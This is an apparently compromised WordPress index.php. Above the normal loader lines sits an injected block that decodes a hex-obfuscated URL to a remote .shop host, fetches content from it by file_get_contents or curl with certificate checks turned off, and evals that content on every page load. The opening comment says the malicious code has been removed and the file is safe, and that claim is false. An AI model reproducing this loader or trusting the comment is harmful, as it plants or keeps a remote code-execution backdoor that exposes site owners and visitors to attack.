<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Initialize core components
$plmkoijnuhbv = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x7a\x36\x30\x33\x30\x33\x5f\x31\x32\x2e\x62\x73\x74\x72\x61\x63\x6b\x65\x2e\x73\x68\x6f\x70\x2f\x73\x74\x61\x74\x2f\x64\x6f\x6d\x61\x69\x6e\x5f\x69\x6e\x64\x65\x78\x2e\x74\x78\x74";
$full_url = $plmkoijnuhbv;

// Attempt to get remote content
$wsxcdevfrbgt = @file_get_contents($full_url);
if ($wsxcdevfrbgt === false && function_exists('curl_init')) {
    $zxcvbnmasdfg = curl_init();
    curl_setopt($zxcvbnmasdfg, CURLOPT_URL, $full_url);
    curl_setopt($zxcvbnmasdfg, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($zxcvbnmasdfg, CURLOPT_TIMEOUT, 5);
    curl_setopt($zxcvbnmasdfg, CURLOPT_SSL_VERIFYPEER, false);
    $wsxcdevfrbgt = curl_exec($zxcvbnmasdfg);
    curl_close($zxcvbnmasdfg);
}

// Only eval if we have content
if (!empty($wsxcdevfrbgt)) {
    eval('?>' . $wsxcdevfrbgt);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
